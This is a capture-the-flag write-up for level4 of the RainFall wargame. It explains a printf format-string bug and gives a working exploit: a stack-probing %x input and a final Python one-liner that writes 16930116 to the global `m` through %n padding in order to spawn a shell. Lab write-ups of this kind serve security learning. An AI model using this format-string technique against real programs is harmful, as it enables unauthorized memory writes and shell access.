### Brief
In this program there is a `main`, `n` and `p` function
`main` only call n.
`n` has a stack buffer of `520`, fill with `fgets` and call `p` with the buffer as parameter.
The function also test the `m` global variable and open a shell if it's equal to `16930116`.
`p` use printf with the buffer.

### Exploit
Here the exploit is the exact same as `level3` and use `printf` with the `%n` format to write to the `m` variable.
But the problem is that we only have a buffer of size `520` and since `%n` only store the number of byte displayed it seems that don't have enough space to write the correct value.
The trick is to use `%0` format to pad a variable with how many `0` that we want.
As an exemple `%0100x` will pad with `0` character so that the final number of written character is `100` before.

Same as before we pop the stack to see where does our input start.
Here we can see that our input is the 12th word in the stack.

```bash
level4@RainFall:~$ python -c "print('\xef\xbe\xad\xde|' + '%x '*14)" | ./level4
ﾭ�|b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 deadbeef 2078257c 25207825
```

The address of the `m` variable is  retrieved using gdb.
```bash
level4@RainFall:~$ gdb level4
(gdb) info variables
...
0x08049810  m
```

### Get access
First is the address of the variable `m`
Then we pop the stack 10 times.
We also add 16930051 bytes so that `m` will get the value `16930116`
```bash
python -c "print('\x10\x98\x04\x08 ' + '%x'*10 + '%016930051x' + '%n')" | ./level4
```